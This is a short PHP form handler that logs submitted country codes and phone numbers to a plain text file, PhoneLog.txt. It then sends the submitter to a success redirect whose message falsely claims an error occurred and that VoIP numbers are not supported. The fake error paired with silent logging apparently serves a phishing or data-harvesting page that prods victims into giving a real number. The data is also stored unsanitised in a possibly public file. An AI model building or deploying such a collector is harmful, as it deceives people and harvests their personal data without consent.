<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $countryCode = $_POST['countryCode'];
    $phoneNumber = $_POST['phoneNumber'];

    // Validate input
    if (empty($countryCode) || empty($phoneNumber)) {
        header("Location: index.php?error=Both fields are required.");
        exit;
    }

    // Log the user input to PhoneLog.txt
    $logEntry = "Country Code: $countryCode, Phone Number: $phoneNumber\n";
    file_put_contents("PhoneLog.txt", $logEntry, FILE_APPEND);

    // Redirect to the index page with a success message
    header("Location: index.php?success=An error has occurred. Please note that free phone number apps or VoIP services are not supported.");
    exit;
} else {
    // Redirect to index page if accessed directly
    header("Location: index.php?error=Invalid request.");
    exit;
}
?>
